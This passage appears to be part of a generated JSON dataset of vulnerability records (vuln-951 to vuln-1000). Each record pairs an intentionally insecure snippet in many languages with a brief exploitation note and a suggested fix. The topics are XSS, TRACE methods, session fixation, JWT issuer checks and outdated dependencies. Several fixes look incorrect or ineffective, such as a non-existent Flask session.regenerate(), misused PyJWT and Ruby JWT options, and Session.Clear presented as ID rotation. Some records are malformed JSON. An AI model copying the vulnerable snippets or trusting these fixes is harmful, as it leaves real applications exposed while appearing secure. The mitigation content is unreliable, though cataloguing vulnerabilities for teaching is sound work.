  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated Go modules.",
  "code_snippet": "require github.com/gin-gonic/gin v1.6.3",
  "exploitation_techniques": "Exploit known module vulnerabilities.",
  "mitigation": "Update: require github.com/gin-gonic/gin v1.9.1 and use govulncheck"
}
{
  "id": "vuln-952",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated NuGet packages.",
  "code_snippet": "<PackageReference Include=\"Newtonsoft.Json\" Version=\"12.0.1\" />",
  "exploitation_techniques": "Exploit known package vulnerabilities.",
  "mitigation": "Update: <PackageReference Include=\"Newtonsoft.Json\" Version=\"13.0.3\" /> and use dotnet list package --vulnerable"
}
{
  "id": "vuln-953",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using vulnerable Gradle dependencies.",
  "code_snippet": "implementation 'com.fasterxml.jackson.core:jackson-databind:2.9.8'",
  "exploitation_techniques": "Exploit known vulnerabilities in libraries.",
  "mitigation": "Update: implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.2' and use dependencyCheck"
}
{
  "id": "vuln-954",
  "language": "Scala",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated SBT dependencies.",
  "code_snippet": "libraryDependencies += \"com.fasterxml.jackson.core\" % \"jackson-databind\" % \"2.9.8\"",
  "exploitation_techniques": "Exploit known library vulnerabilities.",
  "mitigation": "Update: libraryDependencies += \"com.fasterxml.jackson.core\" % \"jackson-databind\" % \"2.15.2\" and use sbt-dependency-check"
}
{
  "id": "vuln-955",
  "language": "Rust",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using vulnerable Cargo dependencies.",
  "code_snippet": "[dependencies] serde = \"1.0.104\"",
  "exploitation_techniques": "Exploit known vulnerabilities in crates.",
  "mitigation": "Update: serde = \"1.0.204\" and use cargo-audit"
}
{
  "id": "vuln-956",
  "language": "Elixir",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated Hex packages.",
  "code_snippet": "{:phoenix, \"~> 1.5.3\"}",
  "exploitation_techniques": "Exploit known package vulnerabilities.",
  "mitigation": "Update: {:phoenix, \"~> 1.7.14\"} and use mix hex.audit"
}
{
  "id": "vuln-957",
  "language": "Perl",
  "vulnerability_type": "Insecure Dependency Management",
  "description": "Using outdated CPAN modules.",
  "code_snippet": "use LWP::UserAgent 5.837;",
  "exploitation_techniques": "Exploit known module vulnerabilities.",
  "mitigation": "Update: use LWP::UserAgent 6.77; and check CPAN for vulnerabilities"
}
{
  "id": "vuln-958",
  "language": "Node.js",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods like TRACE.",
  "code_snippet": "app.all('/endpoint', handler);",
  "exploitation_techniques": "Use TRACE for cross-site tracing attacks.",
  "mitigation": "Restrict: app.use((req, res, next) => { if (req.method === 'TRACE') res.status(405).end(); else next(); })"
}
{
  "id": "vuln-959",
  "language": "Python",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "@app.route('/endpoint', methods=['GET', 'POST', 'TRACE'])",
  "exploitation_techniques": "Exploit TRACE for XST attacks.",
  "mitigation": "Restrict: @app.route('/endpoint', methods=['GET', 'POST'])"
}
{
  "id": "vuln-960",
  "language": "Java",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods like TRACE.",
  "code_snippet": "@RequestMapping(value = \"/endpoint\", method = {RequestMethod.GET, RequestMethod.POST, RequestMethod.TRACE})",
  "exploitation_techniques": "Use TRACE for cross-site tracing.",
  "mitigation": "Restrict: method = {RequestMethod.GET, RequestMethod.POST}"
}
{
  "id": "vuln-961",
  "language": "PHP",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'TRACE') { handle_request(); }",
  "exploitation_techniques": "Exploit TRACE for XST attacks.",
  "mitigation": "Restrict: if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST') { handle_request(); }"
}
{
  "id": "vuln-962",
  "language": "Ruby",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods like TRACE.",
  "code_snippet": "match '/endpoint', to: 'controller#action', via: [:get, :post, :trace]",
  "exploitation_techniques": "Use TRACE for cross-site tracing.",
  "mitigation": "Restrict: via: [:get, :post]"
}
{
  "id": "vuln-963",
  "language": "Go",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "http.HandleFunc(\"/endpoint\", func(w http.ResponseWriter, r *http.Request) { if r.Method == \"TRACE\" || r.Method == \"GET\" || r.Method == \"POST\" { ... } })",
  "exploitation_techniques": "Exploit TRACE for XST attacks.",
  "mitigation": "Restrict: if r.Method == \"GET\" || r.Method == \"POST\" { ... }"
}
{
  "id": "vuln-964",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods like TRACE.",
  "code_snippet": "[AcceptVerbs(\"GET\", \"POST\", \"TRACE\")] public IActionResult Endpoint() { ... }",
  "exploitation_techniques": "Use TRACE for cross-site tracing.",
  "mitigation": "Restrict: [AcceptVerbs(\"GET\", \"POST\")]"
}
{
  "id": "vuln-965",
  "language": "Kotlin",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "route(\"/endpoint\") { get { ... } post { ... } trace { ... } }",
  "exploitation_techniques": "Exploit TRACE for XST attacks.",
  "mitigation": "Restrict: route(\"/endpoint\") { get { ... } post { ... } }"
}
{
  "id": "vuln-966",
  "language": "Scala",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods like TRACE.",
  "code_snippet": "path(\"endpoint\") { get { ... } ~ post { ... } ~ trace { ... } }",
  "exploitation_techniques": "Use TRACE for cross-site tracing.",
  "mitigation": "Restrict: path(\"endpoint\") { get { ... } ~ post { ... } }"
}
{
  "id": "vuln-967",
  "language": "Rust",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "router.any(\"/endpoint\", |req, res| { if req.method() == Method::TRACE { ... } })",
  "exploitation_techniques": "Exploit TRACE for XST attacks.",
  "mitigation": "Restrict: router.route(\"/endpoint\", get(|_, res| ...).post(|_, res| ...))"
}
{
  "id": "vuln-968",
  "language": "Elixir",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods like TRACE.",
  "code_snippet": "match :*, \"/endpoint\", fn conn -> handle_request(conn) end",
  "exploitation_techniques": "Use TRACE for cross-site tracing.",
  "mitigation": "Restrict: get \"/endpoint\", do: handle_request(conn); post \"/endpoint\", do: handle_request(conn)"
}
{
  "id": "vuln-969",
  "language": "Perl",
  "vulnerability_type": "Insecure HTTP Methods",
  "description": "Allowing unsafe HTTP methods.",
  "code_snippet": "if ($r->method eq 'GET' || $r->method eq 'POST' || $r->method eq 'TRACE') { handle_request() }",
  "exploitation_techniques": "Exploit TRACE for XST attacks.",
  "mitigation": "Restrict: if ($r->method eq 'GET' || $r->method eq 'POST') { handle_request() }"
}
{
  "id": "vuln-970",
  "language": "Node.js",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Improper encoding of output data.",
  "code_snippet": "res.send(`<div>${req.query.input}</div>`);",
  "exploitation_techniques": "Inject XSS payloads in output.",
  "mitigation": "Encode: res.send(`<div>${escapeHtml(req.query.input)}</div>`)"
}
{
  "id": "vuln-971",
  "language": "Python",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML output.",
  "code_snippet": "return f'<div>{request.args.get("input")}</div>'",
  "exploitation_techniques": "Execute XSS via unescaped input.",
  "mitigation": "Encode: return f'<div>{html.escape(request.args.get("input"))}</div>'"
}
{
  "id": "vuln-972",
  "language": "Java",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in response.",
  "code_snippet": "out.write(\"<div>\" + request.getParameter(\"input\") + \"</div>\");",
  "exploitation_techniques": "Inject XSS payloads.",
  "mitigation": "Encode: out.write(\"<div>\" + StringEscapeUtils.escapeHtml4(request.getParameter(\"input\")) + \"</div>\")"
}
{
  "id": "vuln-973",
  "language": "PHP",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML output.",
  "code_snippet": "echo \"<div>{$_GET['input']}</div>\";",
  "exploitation_techniques": "Execute XSS via unescaped input.",
  "mitigation": "Encode: echo \"<div>\" . htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8') . \"</div>\";"
}
{
  "id": "vuln-974",
  "language": "Ruby",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML.",
  "code_snippet": "<%= params[:input] %>",
  "exploitation_techniques": "Inject XSS payloads.",
  "mitigation": "Encode: <%= h params[:input] %>"
}
{
  "id": "vuln-975",
  "language": "Go",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML output.",
  "code_snippet": "fmt.Fprintf(w, \"<div>%s</div>\", r.URL.Query().Get(\"input\"))",
  "exploitation_techniques": "Execute XSS via unescaped input.",
  "mitigation": "Encode: fmt.Fprintf(w, \"<div>%s</div>\", html.EscapeString(r.URL.Query().Get(\"input\")))"
}
{
  "id": "vuln-976",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML.",
  "code_snippet": "@Request.Query[\"input\"]",
  "exploitation_techniques": "Inject XSS payloads.",
  "mitigation": "Encode: @Html.Encode(Request.Query[\"input\"])"
}
{
  "id": "vuln-977",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML output.",
  "code_snippet": "call.respondHtml { div { +call.parameters[\"input\"]!! } }",
  "exploitation_techniques": "Execute XSS via unescaped input.",
  "mitigation": "Encode: div { +htmlEscape(call.parameters[\"input\"]!!) }"
}
{
  "id": "vuln-978",
  "language": "Scala",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML.",
  "code_snippet": "Ok(<div>{params("input")}</div>)",
  "exploitation_techniques": "Inject XSS payloads.",
  "mitigation": "Encode: Ok(<div>{HtmlEscape.escape(params("input"))}</div>)"
}
{
  "id": "vuln-979",
  "language": "Rust",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML output.",
  "code_snippet": "res.render_text(format!(\"<div>{}</div>\", req.param(\"input\")?))",
  "exploitation_techniques": "Execute XSS via unescaped input.",
  "mitigation": "Encode: res.render_text(format!(\"<div>{}</div>\", html_escape::encode_text(req.param(\"input\")?)))"
}
{
  "id": "vuln-980",
  "language": "Elixir",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML.",
  "code_snippet": "<div><%= params[\"input\"] %></div>",
  "exploitation_techniques": "Inject XSS payloads.",
  "mitigation": "Encode: <div><%= Phoenix.HTML.escape(params[\"input\"]) %></div>"
}
{
  "id": "vuln-981",
  "language": "Perl",
  "vulnerability_type": "Insecure Output Encoding",
  "description": "Unescaped user input in HTML output.",
  "code_snippet": "$r->print(\"<div>\" . $r->param('input') . \"</div>\");",
  "exploitation_techniques": "Execute XSS via unescaped input.",
  "mitigation": "Encode: $r->print(\"<div>\" . HTML::Entities::encode($r->param('input')) . \"</div>\");"
}
{
  "id": "vuln-982",
  "language": "Node.js",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session IDs after login.",
  "code_snippet": "req.session.user = user; res.redirect('/dashboard');",
  "exploitation_techniques": "Session fixation attacks.",
  "mitigation": "Regenerate: req.session.regenerate(() => { req.session.user = user; res.redirect('/dashboard'); })"
}
{
  "id": "vuln-983",
  "language": "Python",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after authentication.",
  "code_snippet": "session['user'] = user; return redirect('/dashboard')",
  "exploitation_techniques": "Exploit session fixation.",
  "mitigation": "Regenerate: session.regenerate(); session['user'] = user"
}
{
  "id": "vuln-984",
  "language": "Java",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after login.",
  "code_snippet": "session.setAttribute(\"user\", user); response.sendRedirect(\"/dashboard\");",
  "exploitation_techniques": "Session fixation attacks.",
  "mitigation": "Regenerate: session.invalidate(); request.getSession(true).setAttribute(\"user\", user)"
}
{
  "id": "vuln-985",
  "language": "PHP",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after authentication.",
  "code_snippet": "$_SESSION['user'] = $user; header('Location: /dashboard');",
  "exploitation_techniques": "Exploit session fixation.",
  "mitigation": "Regenerate: session_regenerate_id(true); $_SESSION['user'] = $user"
}
{
  "id": "vuln-986",
  "language": "Ruby",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after login.",
  "code_snippet": "session[:user] = user; redirect_to '/dashboard'",
  "exploitation_techniques": "Session fixation attacks.",
  "mitigation": "Regenerate: reset_session; session[:user] = user"
}
{
  "id": "vuln-987",
  "language": "Go",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after authentication.",
  "code_snippet": "session.Values[\"user\"] = user; session.Save(r, w); http.Redirect(w, r, \"/dashboard\", 302)",
  "exploitation_techniques": "Exploit session fixation.",
  "mitigation": "Regenerate: session = sessions.NewSession(store, \"session\"); session.Values[\"user\"] = user"
}
{
  "id": "vuln-988",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after login.",
  "code_snippet": "HttpContext.Session.SetString(\"user\", user.Id); return Redirect(\"/dashboard\");",
  "exploitation_techniques": "Session fixation attacks.",
  "mitigation": "Regenerate: HttpContext.Session.Clear(); HttpContext.Session.SetString(\"user\", user.Id)"
}
{
  "id": "vuln-989",
  "language": "Kotlin",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after authentication.",
  "code_snippet": "call.sessions.set(UserSession(user.id)); call.respond(redirect(\"/dashboard\"))",
  "exploitation_techniques": "Exploit session fixation.",
  "mitigation": "Regenerate: call.sessions.clear<UserSession>(); call.sessions.set(UserSession(user.id))"
}
{
  "id": "vuln-990",
  "language": "Scala",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after login.",
  "code_snippet": "Ok().withSession(\"user\" -> user.id.toString)",
  "exploitation_techniques": "Session fixation attacks.",
  "mitigation": "Regenerate: Ok().withNewSession.withSession(\"user\" -> user.id.toString)"
}
{
  "id": "vuln-991",
  "language": "Rust",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after authentication.",
  "code_snippet": "req.session()?.set(\"user\", user.id)?; res.redirect(\"/dashboard\")",
  "exploitation_techniques": "Exploit session fixation.",
  "mitigation": "Regenerate: req.session()?.clear()?; req.session()?.set(\"user\", user.id)?"
}
{
  "id": "vuln-992",
  "language": "Elixir",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "Not regenerating session after login.",
  "code_snippet": "put_session(conn, :user, user.id) |> redirect(to: \"/dashboard\")",
  "exploitation_techniques": "Session fixation attacks.",
  "mitigation": "Regenerate: configure_session(conn, renew: true) |> put_session(:user, user.id)"
}
{
  "id": "vuln-993",
  "language": "Perl",
  "vulnerability_type": "Insecure Session Regeneration",
  "description": "No session ID regeneration after authentication.",
  "code_snippet": "$r->session->{user} = $user->{id}; $r->redirect('/dashboard');",
  "exploitation_techniques": "Exploit session fixation.",
  "mitigation": "Regenerate: $r->session->clear; $r->session->{user} = $user->{id}"
}
{
  "id": "vuln-994",
  "language": "Node.js",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Not validating token issuer or audience.",
  "code_snippet": "jwt.verify(token, secret, (err, payload) => { if (!err) proceed(payload); });",
  "exploitation_techniques": "Use forged tokens from untrusted issuers.",
  "mitigation": "Validate: jwt.verify(token, secret, { issuer: 'myapp', audience: 'myapp' }, ...)"
}
{
  "id": "vuln-995",
  "language": "Python",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Missing issuer/audience validation for JWT.",
  "code_snippet": "payload = jwt.decode(token, secret, algorithms=['HS256'])",
  "exploitation_techniques": "Forge tokens with invalid issuer/audience.",
  "mitigation": "Validate: jwt.decode(token, secret, algorithms=['HS256'], options={'require': ['iss', 'aud'], 'issuer': 'myapp', 'audience': 'myapp'})"
}
{
  "id": "vuln-996",
  "language": "Java",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Not validating JWT issuer or audience.",
  "code_snippet": "JWT.require(Algorithm.HMAC256(secret)).build().verify(token);",
  "exploitation_techniques": "Use tokens from untrusted sources.",
  "mitigation": "Validate: JWT.require(Algorithm.HMAC256(secret)).withIssuer(\"myapp\").withAudience(\"myapp\").build().verify(token)"
}
{
  "id": "vuln-997",
  "language": "PHP",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Missing issuer/audience validation.",
  "code_snippet": "$payload = JWT::decode($token, new Key($secret, 'HS256'));",
  "exploitation_techniques": "Forge tokens with invalid issuer/audience.",
  "mitigation": "Validate: JWT::decode($token, new Key($secret, 'HS256'), ['iss' => 'myapp', 'aud' => 'myapp'])"
}
{
  "id": "vuln-998",
  "language": "Ruby",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Not validating token issuer or audience.",
  "code_snippet": "payload = JWT.decode(token, secret, true, algorithm: 'HS256')",
  "exploitation_techniques": "Use forged tokens from untrusted issuers.",
  "mitigation": "Validate: JWT.decode(token, secret, true, algorithm: 'HS256', iss: 'myapp', aud: 'myapp')"
}
{
  "id": "vuln-999",
  "language": "Go",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Missing issuer/audience validation for JWT.",
  "code_snippet": "token, _ := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return secretKey, nil })",
  "exploitation_techniques": "Forge tokens with invalid issuer/audience.",
  "mitigation": "Validate: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { if token.Claims.(jwt.MapClaims)[\"iss\"] != \"myapp\" || token.Claims.(jwt.MapClaims)[\"aud\"] != \"myapp\" { return nil, errors.New(\"invalid iss/aud\") } return secretKey, nil })"
}
{
  "id": "vuln-1000",
  "language": "C# (.NET)",
  "vulnerability_type": "Insecure Token Validation",
  "description": "Not validating JWT issuer or audience.",
  "code_snippet": "new JwtSecurityTokenHandler().ValidateToken(token, new TokenValidationParameters { ValidateIssuerSigningKey = true, IssuerSigningKey = key }, out _);",
  "exploitation_techniques": "Use tokens from untrusted sources.",
  "mitigation": "Validate: new TokenValidationParameters { ValidateIssuer = true, ValidIssuer = \"myapp\", ValidateAudience = true, ValidAudience = \"myapp\", IssuerSigningKey = key }"
}